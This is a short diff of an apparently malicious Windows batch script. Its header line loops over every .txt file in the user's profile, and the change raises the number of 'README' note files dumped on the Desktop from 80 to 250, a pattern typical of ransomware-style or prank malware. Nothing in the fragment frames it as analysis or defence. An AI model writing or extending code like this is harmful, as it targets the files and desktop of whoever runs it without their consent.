@@ -25,7 +25,7 @@ for /r "%USERPROFILE%" %%f in (*.txt) do (
 ::create readme.desktop
 setlocal enabledelayedexpansion
 
-for /l %%i in (1,1,80) do (
+for /l %%i in (1,1,250) do (
     echo sarcas1111 > "%USERPROFILE%\Desktop\README%%i.txt"
 )
 
